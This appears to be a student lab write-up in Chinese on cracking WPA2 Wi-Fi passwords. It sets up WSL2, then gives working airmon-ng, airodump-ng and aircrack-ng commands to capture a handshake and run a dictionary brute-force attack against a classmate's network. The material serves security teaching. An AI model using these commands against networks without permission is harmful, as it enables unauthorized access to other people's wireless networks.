利用aircrack-ng工具集进行WPA2破解

1）推荐学会使用windows下的WLS2，使用linux版本的aircrack-ng进行实验；

2）找一个口令字典作为外挂，尝试破解一下另一个同学设置的wifi口令（注意不要破工作环境的wifi，违法）；

3）有余力有兴趣的同学可以尝试一下用PassGAN进一步产生口令字典；

参考资料：http://www.jianshu.com/p/fd16236057df


## 1）推荐学会使用windows下的WLS2，使用linux版本的aircrack-ng进行实验；

### WSL2的安装
参考地址：https://blog.csdn.net/eastking0530/article/details/126613992

#### 1 安装条件

必须运行 Windows 10 版本 2004 及更高版本（内部版本 19041 及更高版本）或 Windows 11

#### 2 启用所需Windows功能
安装WSL2需要启用windows功能中的**虚拟机平台和适用于Linux的Windows子系统**
可以直接使用Windows+R快捷键，在打开的「运行」窗口中直接执行

```shell
optionalfeatures 
```

打开「Windows 功能」，或者在控制面板中打开「Windows 功能」启用需要的功能，然后重新启动
![[Pasted image 20230619064358.png]]

![[Pasted image 20230619064616.png]]

#### 3 设置默认WSL版本
可以通过PowerShell或者cmd使用下面的命令设置默认版本
```js
 wsl --set-default-version <Version>
```
若要将默认版本设置为 WSL1 或 WSL2，请将\<Version>替换为数字 1 或 2，表示对于安装新的 Linux 发行版，你希望默认使用哪个版本的 WSL，例如：
![[Pasted image 20230619064801.png]]
![[Pasted image 20230619065448.png]]


#### 4 安装Linux发行版
可以在Microsoft Store里面，通过关键字搜素，查找相关应用，然后选择一个需要的Linux发行版安装
![[Pasted image 20230619065133.png]]

若Microsoft Store打开不顺畅，可以利用下面的方式安装Linux发行版

1. 可以通过下面的命令查看可安装的Linux发行版

```js
wsl --list --online
```

![[Pasted image 20230619065207.png]]

2. 然后通过下面的命令安装指定的Linux发行版

```js
wsl --install -d <Distribution Name>
```
安装指定的 Linux 发行版，请将\<Distribution Name> 替换为你首选的 Linux 发行版的名称（例如 Ubuntu-20.04）
![[Pasted image 20230619065245.png]]
#### 5 打开Linux发行版

我们可以通过下面的命令查看已经安装的Linux发行版
![[Pasted image 20230619065303.png]]
**初次打开Linux发行版时，需要设置用户名和密码**，输入密码时，屏幕上不会显示任何内容，为盲目键入。

### 使用linux版本的aircrack-ng进行实验；
#### 1 查看可用的无线网卡
```shell
airmon-ng
```
![[Pasted image 20230619070946.png]]

#### 2 将无线网卡以监听模式启动
```shell
airmon-ng start wlan0 9  
iwconfig
```
![[Pasted image 20230619071036.png]]

#### 3 扫描周围WiFi
```js
airodump-ng wlan0mon
```

 BSSID----wifi的mac地址、
 PWR----信号强度（结果一般是按强度排序）、
 Data----监听期间流量总合、
 CH----wifi所用信道、
 ENC----加密算法、
 ESSID----wifi名称
![[Pasted image 20230619071126.png]]

#### 4 开始抓取握手包并保存成文件
```js
# -c指定信道，一定要是上一步查到的要破解的wifi所用信道
# -bssid指定bssid值，一定要是上一步查到的要破解的wifi的bssid
# -w指定捕获的握手到保存到的文件名
airodump-ng -c 11 --bssid B0:D5:9D:42:FA:A3 -w /root/Desktop/wifi_ivs_file wlan0mon
```
![[Pasted image 20230619071208.png]]


## 2）找一个口令字典作为外挂，尝试破解一下另一个同学设置的wifi口令（注意不要破工作环境的wifi，违法）；


#### 使用字典文件暴力破解密码#
```js
# -w指定要使用口令字典文件
# -b指定要目标wifi的mac地址（亦即bssid）
# wifi_ivs_file*.cap是抓取到握手包的数据包文件，*是通配符
aircrack-ng -w /usr/share/nmap/nselib/data/passwords.lst -b B0:D5:9D:42:FA:A3 /root/Desktop/wifi_ivs_file*.cap
```

如果字典文件中存在wifi的密码，那就能找到wifi的密码，如果不包含那就找不到。（所以笼统地讲wifi成功破解率依赖于字典大小）


![[Pasted image 20230619071256.png]]



## 结论

1. 了解无线网络的安全机制：WPA2是一种较为安全的无线网络加密协议，但也存在被破解的可能性。学习如何使用Aircrack-ng破解WPA2密码，可以让人们了解WPA2的安全机制和弱点。
    
2. 掌握网络安全知识和技能：破解WPA2密码需要掌握一定的网络安全知识和技能，如网络抓包、数据包分析、字典攻击等。通过学习和实践，人们可以提高网络安全意识和技能，更好地保护自己和他人的网络安全。
    
3. 加强安全防范意识：利用Aircrack-ng破解WPA2密码可以让人们认识到网络安全的重要性，加强安全防范意识。同时，也可以帮助人们了解网络攻击的手段和方式，更好地预防和应对网络安全威胁。